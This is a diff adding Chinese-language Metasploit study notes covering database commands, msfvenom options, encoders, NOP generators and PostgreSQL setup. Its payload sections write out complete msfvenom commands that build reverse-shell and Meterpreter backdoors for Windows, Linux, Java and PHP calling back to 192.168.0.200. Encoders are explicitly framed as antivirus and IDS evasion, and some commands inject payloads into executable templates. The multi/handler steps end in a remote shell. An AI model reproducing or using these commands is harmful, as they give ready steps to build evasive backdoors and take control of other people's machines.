@@ -376,4 +376,215 @@
 
 
 
+			
+		
+	=================database========================
+	
+		db_connect 		连接一个存在的数据库
+		db_disconnect 	断开与当前数据库实例的连接
+		db_create 		创建一个新的数据库实例
+		db_destroy 		删除一个存在的数据库
+		db_add_host 	添加一个或多个主机到数据库
+		db_add_port 	添加一个端口到主机
+		db_del_host 	从数据库删除一个或多个主机
+		db_del_port 	从数据库删除一个端口
+		db_hosts 		列出数据库中的所有主机
+		db_vulns 		列出数据库中的所有漏洞
+		db_services 	列出数据库中的所有服务
+
+
+		
+
+6.msfvenom(框架管理)
+
+	msfvenom [options] <VALUE=value>
+
+	-p, --payload    <payload>       指定需要使用的payload(攻击荷载)。如果需要使用自定义的payload，
+									请使用"-";或者stdin指定
+    -l, --list       [module_type]   列出指定模块的所有可用资源. 模块类型包括:
+									payloads, encoders, nops, all
+    -n, --nopsled    <length>        为payload预先指定一个NOP滑动长度
+    -e, --encoder    [encoder]       指定需要使用的encoder（编码器）
+    -a, --arch       <architecture>  指定payload的目标架构
+        --platform   <platform>      指定payload的目标平台
+    -s, --space      <length>        设定有效攻击荷载的最大长度
+    -b, --bad-chars  <list>          设定规避字符集，比如: &#039;\x00\xff&#039;
+    -i, --iterations <count>         指定payload的编码次数
+    -c, --add-code   <path>          指定一个附加的win32 shellcode文件
+    -x, --template   <path>          指定一个自定义的可执行文件作为模板
+    -k, --keep                       保护模板程序的动作，注入的payload作为一个新的进程运行
+        --payload-options            列举payload的标准选项
+    -o, --out   <path>               保存payload
+    -h, --help                       查看帮助选项
+	-f, --format     <format>        指定输出格式 (使用 --help-formats 来获取msf支持的输出格式列表)
+									  asp, aspx, aspx-exe, axis2, dll, elf, elf-so, exe, exe-only, 
+									  exe-service, exe-small, hta-psh, jar, jsp, loop-vbs, macho, 
+									  msi, msi-nouac, osx-app, psh, psh-cmd, psh-net, psh-reflection,
+									  vba, vba-exe, vba-psh, vbs, war
+									  bash, c, csharp, dw, dword, hex, java, js_be, js_le, num, perl,
+									  pl, powershell, ps1, py, python, raw, rb, ruby, sh, 
+									  vbapplication, vbscript
+ 
+
+ 
+ 
+ 
+7.Encoders(编码器框架)
+
+	编码器的第一个使命是确保攻击载荷中不会出现渗透攻击过程中应加以避免的“坏字符”，
+	
+这些“坏字符”的存在将导致特殊构造的邪恶数据缓冲区无法按照预期目标完全输入到存有漏洞
+
+的软件例程中，从而使得渗透攻击触发漏洞之后无法正确执行攻击载荷，达成控制系统的目标。
+
+	编码器的第二个使命是对攻击载荷进行“免杀”处理，即逃避反病毒软件、IDS入侵检测系统
+	
+和IPS入侵防御系统的检测与阻断。
+
+
+================================================================
+	
+	(1)反反病毒(采用编码)
+
+		
+		msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.200 
+		-i 10 -e x86/shikata_ga_nai -f exe -o /root/123.exe
+		
+		
+==================================================================
+	
+
+
+	
+
+8.NOP Generators(空指令生成器框架)
+	
+		空指令（NOP）是一些对程序运行状态不会造成任何实质影响的空操作或无关操作指令，
+		
+最典型的空指令就是空操作，在x86 CPU体系架构平台上的操作码是0x90。
+
+	
+
+
+	
+	
+9.Palyloads(攻击载荷框架)
+		
+		攻击载荷是在渗透攻击成功后促使目标系统运行的一段植入代码，通常作用是为
+	
+渗透攻击者打开在目标系统上的控制会话连接。
+
+	
+==============================================================
+
+	(1)后门
+	
+	1)windows
+		msfvenom -p windows/meterpreter/reverse_tcp  LHOST=192.168.0.200 
+		-f exe -o /root/123.exe
+		
+		将123.exe放到windows下
+		
+		msf>search handler
+		msf>use exploit/multi/handler
+		msf>show options
+		msf>set payload windows/meterpreter/reverse_tcp
+		msf>show options
+		msf>set LHOST 192.168.0.200 
+		msf>exploit
+		meterpreter>shell
+	
+	2)linux
+	
+		msfvenom -p linux/x86/shell_reverse_tcp  LHOST=192.168.0.200 
+		-f sh -o /root/123
+		
+		将123放到linux下
+		
+		msf>search handler
+		msf>use exploit/multi/handler
+		msf>show options
+		msf>set payload linux/x86/shell_reverse_tcp
+		msf>show options
+		msf>set LHOST 192.168.0.200 
+		msf>exploit
+		meterpreter>shell
+		
+	3)java
+	
+		msfvenom -p java/meterpreter/reverse_tcp  LHOST=192.168.0.200 
+		-f java -o /root/123.java
+		
+	4)PHP
+	
+		msfvenom  -p php/meterpreter/reverse_tcp  LHOST=192.168.0.200 
+		-e php/base64 -t php -o /root/123.php
+		
+==============================================================
+
+	(2)自定义payload
+	
+		cat payload_file.bin | ./msfvenom -p - -a x86 --platform win -e x86/shikata_ga_nai -f raw
+
+		利用模板(/opt/metasploit/apps/pro/data/exe_templates/)
+		
+		msfvenom -p windows/meterpreter/bind_tcp -x template_x64_windows.exe -f exe -o /root/123.exe
+
+		
+		
+		
+10.数据库PostgreSQL
+	
+	 #安装postgresql
+	 pacman -S postgresql
+	 #数据库集群必须被初始化
+	 su - postgres -c "initdb --locale en_US.UTF-8 -E UTF8 -D '/var/lib/postgres/data'"
+	 #启动PostgreSQL
+	  systemctl start postgresql.service
+	  systemctl enable postgresql.service
+	 #创建数据库用户与数据库
+	 createuser --interactive	(postgres用户创建)
+	 createdb msf (root用户创建)
+	 #配置
+	 /opt/metasploit/vendor/bundle/ruby/2.3.0/gems/metasploit-credential-2.0.8/spec/dummy/config/database.yml
+	 move to ~/.msf4/database.yml
+	#修改
+		production:
+			adapter: postgresql
+			database: msf
+			username: ${USER}
+			password: ${PASS}
+			host: localhost
+			port: 5432
+			pool: 5
+			timeout: 5
+	#重建缓存
+	msf>db_rebuild_cache
+	
+	
+	
+	
+	
+	metasploit中默认使用postgres数据库,来进行数据库查询
+	
+	相关配置文件
+	
+	/opt/metasploit/vendor/bundle/ruby/2.3.0/gems/metasploit-credential-2.0.8/spec/dummy/config/database.yml
+	
+	
+	
+	
+Back参数‍‍
+
+Back参数主要用于返回。比如你进入了某一个漏洞模块的设置，但是你想再重新选择一个漏洞模块，那么就需要用到back参数。
+
+这张图说明，才开始我使用了ms08_067_netapi的利用模块，之后使用了back参数返回。
+
+
+	
+	
+	
+
+
+
 	
